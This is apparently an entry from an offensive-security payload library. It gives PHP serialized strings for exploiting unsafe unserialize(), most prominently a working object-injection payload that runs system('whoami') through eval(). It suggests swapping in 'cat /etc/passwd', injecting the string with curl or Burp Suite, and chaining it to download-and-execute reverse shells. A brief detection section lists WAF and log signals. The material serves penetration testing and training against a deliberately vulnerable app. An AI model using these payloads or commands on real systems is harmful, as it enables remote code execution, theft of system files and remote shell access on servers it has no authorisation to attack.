---
id: 020b0940-4ada-4f12-866d-5939b3327b67
name: PHP-Object-Injection-Serialized-Payload
type: code
language: php
verified: true
created_at: '2023-04-06T03:55:59.308098+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
  - PHP
tags:
  - payload
  - rce
  - deserialization
  - exploit
validated: true
---

# PHP-Object-Injection-Serialized-Payload

## Code

```php
# Basic serialized data
a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}

# Command execution
string(68) "O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}"
```

## Description

This code snippet provides PHP serialized strings for testing and exploiting deserialization vulnerabilities. The basic example shows a harmless array serialization. The malicious payload serializes a PHPObjectInjection object with an 'inject' property containing a system() call to execute 'whoami', triggering eval() in __wakeup() for RCE upon unserialization.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| inject | PHP code to execute via eval() (e.g., system('command')) | system('whoami'); |
| class name | Target class (e.g., PHPObjectInjection) | PHPObjectInjection |

No dynamic variables; replace the command in 'inject' for custom execution (e.g., system('cat /etc/passwd');).

## Usage

Encode the malicious string (e.g., O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}) and inject into vulnerable parameters like 'r' using tools like curl or Burp Suite. Used in web exploitation scenarios targeting PHP apps with unsafe unserialize(). Chain with reverse shells by setting inject to download and execute payloads.

## Detection

- WAF rules matching long base64-like strings in parameters or eval() patterns.
- PHP logs showing __wakeup() calls on unexpected classes or system() invocations.
- Network anomalies from command output exfiltration or outbound connections.
- File integrity monitoring for unexpected script downloads triggered by payloads.

## Related

- [[procedures/PHP-Deserialization-Code-Execution]]
- [[tools/Burp-Suite]]
